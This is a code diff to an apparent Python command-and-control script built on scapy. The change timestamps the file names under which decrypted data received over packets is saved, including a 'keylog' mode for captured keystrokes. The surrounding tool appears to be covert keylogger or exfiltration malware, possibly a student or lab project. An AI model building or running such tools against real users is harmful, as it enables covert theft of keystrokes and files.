@@ -4,6 +4,7 @@
 from scapy.all import *
 from multiprocessing import Process
 import sys, time, argparse, setproctitle
+from datetime import datetime
 import encryption as encryption
 
 
@@ -65,6 +66,8 @@ def read_pkt(pkt):
 
 
 def decrypt_response():
+    filename = ""
+
     with open("rawdata.txt", "rb") as file:
         data = file.read()
 
@@ -74,13 +77,13 @@ def decrypt_response():
 
     mode = data_split[1].decode("utf-8")
 
-    filename = ""
+    current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
 
     # Write decrypted contents to file
     if "keylog" in mode:
-        filename = "keylog.txt"
+        filename = f"[{current_time}] keylog.txt"
     else:
-        filename = mode
+        filename = f"[{current_time}] {mode}"
 
     with open(filename, "wb") as file:
         file.write(decrypted)
